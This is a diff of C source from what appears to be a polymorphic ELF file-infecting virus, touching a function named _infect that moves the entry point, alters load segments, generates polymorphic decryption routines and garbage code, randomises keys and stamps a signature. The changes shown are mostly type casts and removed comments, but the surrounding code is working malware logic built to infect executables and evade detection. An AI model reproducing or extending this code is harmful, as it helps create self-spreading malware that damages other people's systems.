@@ -129,7 +129,7 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 
 	void *route = (void*)(*s + pos + p.decrypt_routine_off);
 	//void *xx = ft_malloc(1024);
-	poly_generate(&p.encrypt_routine, &route);
+	poly_generate((void**)&p.encrypt_routine, (void**)&route);
 	//reset it
 	elf_shift_offset(*s, *n, pos, p.bn);
 	elf_update_flags_of_load_segments(*s, *n);
@@ -137,11 +137,9 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 	elf_set_off_entry(*s, *n, pos);
 	h = (void*)*s;
 	ph = (*(void**)s) + h->e_phoff;
-	//TODO: check not already inf
-	//ph[x].p_memsz += changed;
 	poly_new_start((*s) + pos, p.infect_push_off, p.infect_pop_off);
 	randomize_key();
-	update_tables((*s)+pos, p.bn, p);
+	update_tables((unsigned char *)(*s)+pos, p.bn, p);
 	update((*s) + pos, p.bn, old_entry, h->e_entry, opt, *s, *n, p);
 	//---------- z3 (encryption with compression) ----------------
 	bool compressed = TRUE;
@@ -157,8 +155,7 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 		return FALSE;
 	((unsigned char*)key)[0] ^= 0b01110010;
 
-	//int get_sig(char *s, size_t n, size_t virus_len, char *sig)
-	get_sig(*s, *n, p.bn, ((uint64_t *)(char*)((*s) + pos + p.dataearly_off)) + 2);
+	get_sig(*s, *n, p.bn, (char *)(((uint64_t *)(char*)((*s) + pos + p.dataearly_off)) + 2));
 
 	ffree(olds2, oldn2);
 	if (olds)
@@ -173,10 +170,8 @@ void update_tables(unsigned char *b, size_t len, struct s_infect_params p) {
 	Modif *modif_table = ((Modif *)(b + p.modif_table_off));
 	unsigned int modif_table_len = *((unsigned int *)(b + p.modif_table_len_off));
 
-	unsigned char *prev = NULL;
 	for (size_t i = 0 ; i < gb_table_len; i++){
-		generate_garb(b + gb_table[i].off, gb_table[i].len, prev);
-		prev = gb_table[i].off + gb_table[i].len;
+		generate_garb((char*)b + gb_table[i].off, gb_table[i].len);
 	}
 
 	for (size_t i = 0 ; i < modif_table_len; i++){
